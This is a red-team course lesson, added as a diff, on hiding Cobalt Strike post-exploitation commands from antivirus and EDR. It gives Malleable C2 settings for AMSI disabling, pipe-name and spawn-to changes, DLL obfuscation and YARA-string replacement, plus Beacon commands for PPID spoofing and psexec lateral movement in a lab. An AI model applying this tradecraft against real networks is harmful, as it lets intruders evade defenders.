@@ -1,0 +1,215 @@
+# Post-ex Fork & Run
+
+Getting a Beacon running, either from an artifact on disk or in-memory, is only the first step.  There are many post-exploitation commands that we need to run for enumeration, credential access, lateral movement, etc, and these commands do not benefit from the same evasion capabilities that Beacon has enabled by default.
+
+This lesson will run through common ways in which a post-ex command can be detected by anti-virus and how to mitigate them.  Most of them relate to fork and run commands, because they are by far the most risky from an OPSEC perspective.
+
+The workflow for fork and run looks something like this:![](https://lwfiles.mycourse.app/66e95234fe489daea7060790-public/738fdd2c41760d3713ca51c388d28048.png)
+
+When Beacon receives a fork & run task, it will either spawn a new process or open a handle to an existing process, depending on whether the spawn or explicit variant is being used.  Beacon will inject the post-ex reflective DLL into the target process in the form of shellcode, and then starts a new thread to run it.  This is achieved using the typical VirtualAllocEx/WriteProcessMemory/CreateRemoteThread style of injection.
+
+The first thing the post-ex capability does is start a new SMB named pipe.  It will then do its work and continuously write any output to that pipe.  Meanwhile, Beacon will make a connection to the pipe, read the output from it, and send it back to the team server for the operators to see.
+
+When the post-ex capability has finished its work, it tears down the named pipe and calls either ExitProcess (if the spawn variant was used) or ExitThread (if the explicit variant was used).  Beacon will detect that the named pipe has been closed, gracefully stops reading from it, and reports the task as complete.
+
+### CreateRemoteThread <a href="#el_1745267919059_411" id="el_1745267919059_411"></a>
+
+This API has traditionally been the most widely used to kick off execution in a remote process and its use can be detected by security drivers running in the Kernel via the [PsSetCreateThreadNotifyRoutine](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-pssetcreatethreadnotifyroutine) function.  To push back on this, Beacon can be configured to use APIs other than CreateRemoteThread in the `process-inject.execute` block of Malleable C2.
+
+Multiple options can be provided which Beacon evaluates top-to-bottom to pick the most appropriate one depending on the scenario.  The options are:
+
+* CreateThread
+* CreateRemoteThread
+* SetThreadContext
+* ObfSetThreadContext
+* NtQueueApcThread
+* NtQueueApcThread-s
+* RtlCreateUserThread
+
+Some techniques are not appropriate for use when performing cross-architecture injection (i.e. 32-bit to 64-bit and vice versa), so ensure you have all your basis covered.  More information about each technique is provided in the [official documentation](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/malleable-c2-extend_process-injection.htm).
+
+```
+process-inject {
+   execute {
+      NtQueueApcThread-s;
+      NtQueueApcThread;
+      SetThreadContext;
+      CreateThread;
+   }
+}
+```
+
+\
+The ObfSetThreadContext technique uses CreateRemoteThread under the hood; and RtlCreateUserThread is often attributed as CreateRemoteThread by tools like Sysmon.
+
+### Named pipe names <a href="#el_1745268208170_553" id="el_1745268208170_553"></a>
+
+The default named pipe name that Beacon uses with its post-ex DLLs is `postex_####` (where `#` is a random hex value). These pipe names are trivial to detect by drivers, such as Sysmon, and some 'known-bad' names are also included in SwiftOnSecurity's [sysmon-config](https://github.com/SwiftOnSecurity/sysmon-config/blob/master/sysmonconfig-export.xml#L863) project.
+
+The `post-ex.pipename` Malleable C2 option accepts a comma-separated list of alternate pipe names, where a random one is chosen each time.  For example:
+
+```
+post-ex {
+   set pipename "dotnet-diagnostic-#####, ########-####-####-####-############";
+}
+```
+
+Because of the high volume of named pipes on Windows, it's likely an organisation will only log known-bad pipes from threat intel sources, etc, rather than every named pipe instance.  You're therefore probably safe picking anything that looks convincing enough to blend in with normal named pipe names.
+
+### Parent-Child relationships <a href="#el_1745268597310_662" id="el_1745268597310_662"></a>
+
+Relationships are hard.  In Windows, a process is typically spawned as a child of the process that started it.  In the case of our initial access, Beacon is running inside an MS Edge process.  It would look highly anomalous if it were then to spawn a process such as rundll32 (which is Beacon's default spawn-to)..
+
+<figure><img src="https://lwfiles.mycourse.app/66e95234fe489daea7060790-public/83d74b12258e394f81d53936377985be.png" alt=""><figcaption></figcaption></figure>
+
+Operators can change this spawn-to process at runtime, via the `spawnto` command.  This sets the spawn-to independently for that particular Beacon and should be used to contextualise its spawn-to prior to running any fork and run commands.  For example, MS Edge will spawn new Edge processes per open tab.  We can therefore set our spawn-to to MS Edge to blend in with that pattern.
+
+```batch
+beacon> spawnto x64 "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"
+beacon> powerpick Start-Sleep -s 60
+```
+
+<figure><img src="https://lwfiles.mycourse.app/66e95234fe489daea7060790-public/a55cdd4bc0a896d13f9527d84560bcad.png" alt=""><figcaption></figcaption></figure>
+
+\
+You can also change the default spawn-to process from rundll32 via the `post-ex.spawnto` option in Malleable C2.  For example:
+
+```
+post-ex {
+   set spawnto_x86 "%windir%\\syswow64\\svchost.exe"; 
+   set spawnto_x64 "%windir%\\sysnative\\svchost.exe";
+}
+```
+
+### psexec spawnto <a href="#el_1742398572966_790" id="el_1742398572966_790"></a>
+
+Beacon's `jump psexec[64]` command uses the service binary artifact to run a Beacon payload, which is the one that spawns a new process to inject into (all the others inject into themselves).  This behaviour allows the service and service binary to be cleaned up immediately after execution.  The service binary cannot use a spawn-to value that contains environment variables like `%windir%`, so the artifact kit adds a dedicated command, called `ak-settings`, which allows you to control its spawn-to separately.
+
+```batch
+beacon> help ak-settings
+Usage: ak-settings [setting] [value]
+
+Set settings to be used for generating artifacts through the artifact kit
+
+Supported settings:
+   service - Set the name to return for the PSEXEC_SERVICE hook.
+   spawnto_[x86|x64] - Set the migration process to use for the service executable artifacts.
+
+Usage Examples:
+   ak-settings service updater
+   ak-settings spawnto_x64 [c:\path\to\whatever.exe]
+
+No arguments will display the current settings.
+```
+
+For example, to set the spawnto host to svchost, we would do:
+
+```batch
+beacon> ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
+beacon> ak-settings spawnto_x86 C:\Windows\SysWOW64\svchost.exe
+
+beacon> ak-settings
+[*] artifact kit settings:
+[*]    service     = ''
+[*]    spawnto_x86 = 'C:\Windows\SysWOW64\svchost.exe'
+[*]    spawnto_x64 = 'C:\Windows\System32\svchost.exe'
+
+beacon> jump psexec64 lon-ws-1 smb
+```
+
+<figure><img src="https://lwfiles.mycourse.app/66e95234fe489daea7060790-public/fc199ecd1c4262cc4282dc2d60e9aa0a.png" alt="" width="100%"><figcaption></figcaption></figure>
+
+### Image Load Events <a href="#el_1745268758082_743" id="el_1745268758082_743"></a>
+
+A post-ex capability will typically have dependencies on other Windows modules (DLLs) for its functionality.  Many of these will be loaded into a process by default, such as kernel32.dll.  However, some will need to be loaded explicitly by the post-ex DLL's reflective loader.  Some notable examples include _System.Management.Automation.dll_, which is required by `powerpick` and `psinject`; and _cryptdll.dll_, _samlib.dll_, and _vaultcli.dll_ which are required by `mimikatz`.
+
+Organisations can log instances of these DLLs being loaded by unexpected processes and flag them for further investigation.  When using fork and run commands, an operator should take care to inject these capabilities into a process that is known to load any modules that a post-ex DLL requires.  However, this can contradict with the parent-child strategy outlined above.  For example, there's probably no process that legitimately loads System.Management.Automation.dll that is also found as a legitimate child of MS Edge. &#x20;
+
+For commands that have an explicit variant of fork and run, you're probably better off doing that to inject the post-ex capability into a target process that makes sense for the image loads.  However, some commands, like `execute-assembly`, don't have an explicit variant.
+
+The parent process ID (PPID) spoofing technique is useful for these scenarios, as it allows Beacon to spawn processes under an arbitrary parent (as long as we have the privileges to obtain a handle to the desired parent process).  For example, we could use the `ps` command or process browser to find the PID of explorer.exe, set it as the `ppid`, set the `spawnto`, and then run the post-ex command.
+
+```batch
+beacon> ppid 6648
+beacon> spawnto x64 C:\Windows\System32\msiexec.exe
+beacon> powerpick Start-Sleep -s 60
+```
+
+<figure><img src="https://lwfiles.mycourse.app/66e95234fe489daea7060790-public/aba39559646388e8237c52953fab52ac.png" alt=""><figcaption></figcaption></figure>
+
+\
+To reset the PPID back to Beacon, run ppid without any arguments.
+
+### AMSI <a href="#el_1742395992062_369" id="el_1742395992062_369"></a>
+
+Both PowerShell and .NET are instrumented by AMSI which means any post-ex PowerShell script or .NET assembly may be detected by an anti-virus.  You'll likely see this with popular tools such as PowerView and Rubeus.
+
+```batch
+beacon> powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1
+beacon> powershell Get-Domain
+This script contains malicious content and has been blocked by your antivirus software.
+
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe
+[-] Failed to load the assembly w/hr 0x8007000b
+```
+
+There's a simple option that we can add to Cobalt Strike's Malleable C2 profile, called `amsi_disable`.
+
+```batch
+post-ex {
+   set amsi_disable "true";
+}
+```
+
+This instructs the post-ex reflective loader used with the `powerpick`, `psinject`, and `execute-assembly` commands to patch the AMSI DLL in-memory before executing the script or assembly.
+
+{% hint style="info" %}
+`amsi_disable` DOES NOT apply to the `powershell` command - use `powerpick` or `psinject` instead.
+{% endhint %}
+
+### Post-ex DLL obfuscation <a href="#el_1742401140579_558" id="el_1742401140579_558"></a>
+
+Changing the spawnto and enabling an AMSI bypass for your post-ex fork and run commands is by no means a silver bullet, as there is still plenty of opportunity for an anti-virus to inspect the post-ex capability after it has been injected.  These are usually found by memory scans that are triggered when the new thread is created in the remote process.
+
+There are a few options that we can add to Malleable C2 to help obfuscate the post-ex DLL to lower the chance that a memory scanner will spot it as malicious.
+
+```batch
+post-ex {
+   set obfuscate "true";
+   set cleanup "true";
+   set smartinject "true";
+}
+```
+
+* \
+  `post-ex.obfuscate` is similar to the `stage.obfuscate` and `stage.userwx` options available for Beacon.  It scrambles the content of the post-ex DLLs and settles the post-ex capability into memory in a more OPSEC-safe way.  Some long-running post-ex DLLs will also mask and unmask their string table when this option is set.
+* `post-ex.cleanup` frees the post-ex reflective loader from memory after the post-ex DLL is loaded.  This is the same as `stage.cleanup` for Beacon, which is an option that is enabled by default since 4.11.
+* `post-ex.smartinject` instructs Beacon to pass key function pointers to the post-ex DLL, which allows it to bootstrap itself without resolving them again.
+
+There are also `transform` options which allows you to replace strings in the post-ex DLLs.  `strrepex` allows you to replace strings in a specific DLL and `strrep` allows you to replace strings in any/all post-ex DLLs.  For example, we could replace a string in the post-ex DLL responsible for execute-assembly; and replace a generic string in every post-ex DLL.
+
+```batch
+post-ex {
+   ...
+
+   transform-x64 {
+      strrep "ReflectiveLoader" "NetlogonMain";
+      strrepex "ExecuteAssembly" "Invoke_3 on EntryPoint failed." "Assembly threw an exception";
+   }
+}
+```
+
+The valid post-ex names are:
+
+* ExecuteAssembly
+* Mimikatz
+* PowerPick
+* PortScanner
+* BrowserPivot
+* Hashdump
+* NetView
+* Keylogger
+* Screenshot
+* SSHAgent
+
+Public resource like [Elastic's YARA repository](https://github.com/elastic/protections-artifacts/blob/main/yara/rules/Windows_Trojan_CobaltStrike.yar) is a great resource for finding candidates to change.
